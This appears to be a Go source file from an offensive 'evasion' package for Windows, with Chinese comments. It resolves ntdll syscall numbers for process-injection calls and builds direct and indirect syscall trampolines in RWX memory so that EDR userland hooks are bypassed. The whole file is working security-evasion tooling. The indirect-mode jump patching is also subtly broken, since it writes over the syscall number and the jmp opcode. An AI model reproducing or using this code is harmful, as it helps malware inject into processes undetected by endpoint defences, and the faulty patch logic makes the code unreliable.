//go:build windows && amd64

// 直接/间接 syscall 实现（amd64）。
//
// 原理：ntdll 的 NtXxx 导出函数体开头固定为：
//   mov r10, rcx      ; 4c 8b d1
//   mov eax, SSN      ; b8 <imm32>   （syscall 号）
//   syscall           ; 0f 05
//   ret               ; c3
// 解析导出函数体即可获得 SSN 与 syscall 指令地址。EDR userland hook 会改写函数体
// 开头（jmp 到检测代码）——绕过方式：
//   - direct：把"mov eax, SSN; syscall; ret"写进可执行内存，完全不经 ntdll 函数体
//   - indirect：跳回 ntdll 内的 syscall 指令（返回地址落在 ntdll 内，
//     规避"返回地址不在 ntdll"的调用方检查；trampoline 本身不执行 syscall）
package evasion

import (
	"errors"
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	ntdllAddr uintptr

	// 已解析的系统调用信息（惰性初始化）
	resolved = map[string]syscallInfo{}

	// 按模式构建的 trampoline
	trampolines map[string]uintptr
)

type syscallInfo struct {
	ssn         uintptr // syscall 号
	syscallAddr uintptr // ntdll 内 syscall 指令地址
}

// PrepareTrampolines 解析常用 NtXxx 的 SSN 并构建 trampoline（direct/indirect）。
func PrepareTrampolines(mode string) error {
	if mode != "direct" && mode != "indirect" {
		return fmt.Errorf("未知 syscall 模式: %s", mode)
	}
	ntdll, err := windows.LoadDLL("ntdll.dll")
	if err != nil {
		return fmt.Errorf("加载 ntdll.dll: %v", err)
	}
	ntdllAddr = uintptr(unsafe.Pointer(ntdll.Handle)) // ntdll 基址（LoadDLL 句柄=模块基址）
	trampolines = make(map[string]uintptr)

	names := []string{
		"NtCreateThreadEx",
		"NtProtectVirtualMemory",
		"NtAllocateVirtualMemory",
		"NtWriteVirtualMemory",
		"NtOpenProcess",
	}
	for _, name := range names {
		info, err := resolveSyscallInfo(name)
		if err != nil {
			continue // 缺失的系统调用跳过（版本差异）
		}
		resolved[name] = info
		trampoline, err := buildTrampoline(mode, info)
		if err != nil {
			continue
		}
		trampolines[name] = trampoline
	}
	if len(trampolines) == 0 {
		return errors.New("未解析到任何系统调用信息")
	}
	return nil
}

// resolveSyscallInfo 解析 ntdll 导出函数的 SSN 与 syscall 指令地址。
func resolveSyscallInfo(name string) (syscallInfo, error) {
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	p := ntdll.NewProc(name)
	if err := p.Find(); err != nil {
		return syscallInfo{}, fmt.Errorf("解析 %s: %v", name, err)
	}
	body := (*[64]byte)(unsafe.Pointer(p.Addr()))
	// mov r10, rcx (4c 8b d1) | mov eax, imm32 (b8 xx xx xx xx) | syscall (0f 05) | ret (c3)
	if body[0] != 0x4C || body[1] != 0x8B || body[2] != 0xD1 {
		return syscallInfo{}, fmt.Errorf("%s 函数体前缀异常（可能已 hook）: %x %x %x", name, body[0], body[1], body[2])
	}
	if body[3] != 0xB8 {
		return syscallInfo{}, fmt.Errorf("%s 未找到 mov eax,imm（可能已 hook）", name)
	}
	ssn := uintptr(body[4]) | uintptr(body[5])<<8 | uintptr(body[6])<<16 | uintptr(body[7])<<24
	// syscall 指令 = mov eax 之后 3 字节（0f 05 为 2 字节，ret 在其后）：
	// 常规 stub: 4c 8b d1 | b8 imm32 | 0f 05 | c3
	if body[8] != 0x0F || body[9] != 0x05 {
		return syscallInfo{}, fmt.Errorf("%s 未找到 syscall 指令", name)
	}
	return syscallInfo{
		ssn:         ssn,
		syscallAddr: p.Addr() + 8,
	}, nil
}

// buildTrampoline 构建可执行 trampoline：
//   direct:   4c 8b d1 | b8 <ssn> | 0f 05 | c3
//   indirect: 4c 8b d1 | b8 <ssn> | e9 <rel32>（jmp ntdll syscall 指令）
func buildTrampoline(mode string, info syscallInfo) (uintptr, error) {
	var code []byte
	if mode == "direct" {
		code = []byte{
			0x4C, 0x8B, 0xD1, // mov r10, rcx
			0xB8, byte(info.ssn), byte(info.ssn >> 8), byte(info.ssn >> 16), byte(info.ssn >> 24), // mov eax, ssn
			0x0F, 0x05, // syscall
			0xC3, // ret
		}
	} else { // indirect
		code = []byte{
			0x4C, 0x8B, 0xD1,
			0xB8, byte(info.ssn), byte(info.ssn >> 8), byte(info.ssn >> 16), byte(info.ssn >> 24),
			0xE9, 0, 0, 0, 0, // jmp rel32
		}
		// rel32 = syscallAddr - (trampoline + 5)  —— 先分配后回填
	}
	// 可执行内存分配（RWX 小块 trampoline）
	size := uintptr(len(code) + 8)
	base, err := windows.VirtualAlloc(0, size, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil || base == 0 {
		return 0, fmt.Errorf("VirtualAlloc trampoline: %v", err)
	}
	dst := (*[64]byte)(unsafe.Pointer(base))
	for i, b := range code {
		dst[i] = b
	}
	if mode == "indirect" {
		// 回填 jmp rel32：target = syscallAddr
		target := int64(info.syscallAddr)
		from := int64(base + 10) // jmp(5 字节)下一条指令地址 = base+5+5
		rel := target - from
		dst[6] = byte(rel)
		dst[7] = byte(rel >> 8)
		dst[8] = byte(rel >> 16)
		dst[9] = byte(rel >> 24)
	}
	return base, nil
}

// Syscall 通用执行（最多 8 个参数；参数按 Windows x64 调用约定由 Go runtime 放置）。
// 返回 syscall 的 NTSTATUS。
func Syscall(name string, args ...uintptr) (uintptr, error) {
	tramp, ok := trampolines[name]
	if !ok {
		return 0, fmt.Errorf("未解析的 syscall: %s", name)
	}
	n := len(args)
	if n > 8 {
		return 0, errors.New("参数过多")
	}
	callArgs := make([]uintptr, 9)
	callArgs[0] = tramp
	for i, a := range args {
		callArgs[i+1] = a
	}
	status := syscallN(callArgs...)
	return status, nil
}

// syscallN 直通 runtime syscall（无 ntdll 包装，trampoline 被执行；
// 标准库 syscall.SyscallN 按 Windows x64 调用约定放置参数并 CALL trap）
func syscallN(args ...uintptr) uintptr {
	status, _, _ := syscall.SyscallN(args[0], args[1:]...)
	return status
}
